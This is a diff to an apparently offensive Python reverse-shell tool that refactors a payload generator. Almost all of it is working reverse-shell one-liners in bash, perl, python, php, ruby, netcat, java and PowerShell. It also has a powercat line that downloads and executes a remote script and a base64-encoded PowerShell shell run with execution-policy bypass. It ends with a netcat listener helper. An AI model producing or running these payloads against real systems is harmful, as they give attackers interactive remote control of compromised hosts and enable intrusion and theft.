@@ -68,32 +68,42 @@ class ShellListener:
         while self.running and self.connection is not None:
             self.sendline(input())
 
-def generatePayload(type, local_address, port):
+def generatePayload(type, local_address, port, index=None):
+
+    commands = []
 
     if type == "bash":
-        return "bash -i >& /dev/tcp/%s/%d 0>&1" % (local_address, port)
+        commands.append(f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1")
     elif type == "perl":
-        return "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n" \
-        "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"%s:%d\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" % (local_address, port, local_address, port)
+        commands.append(f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'")
+        commands.append(f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
     elif type == "python" or type == "python2" or type == "python3":
         binary = type
-        return "%s -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" % (binary, local_address, port)
+        commands.append(f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
     elif type == "php":
-        return "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" % (local_address, port)
+        commands.append(f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
     elif type == "ruby":
-        return "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'" % (local_address, port)
+        commands.append(f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'")
     elif type == "netcat" or type == "nc":
-        return "nc -e /bin/bash %s %d\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f" % (local_address, port, local_address, port)
+        commands.append(f"nc -e /bin/bash {local_address} {port}")
+        commands.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {local_address} {port} >/tmp/f")
     elif type == "java":
-        return "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" % (local_address, port)
+        commands.append(f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()")
     elif type == "xterm":
-        return "xterm -display %s:1" % (local_address)
+        commands.append(f"xterm -display {local_address}:1")
     elif type == "powercat":
         return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
     elif type == "powershell":
         payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
         payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
         return f"powershell.exe -exec bypass -enc {payload_encoded}"
+    else:
+        return None
+
+    if index is None or index < 0 or index >= len(commands):
+        return "\n".join(commands)
+    else:
+        return commands[index]
 
 def spawn_listener(port):
     pty.spawn(["nc", "-lvvp", str(port)])
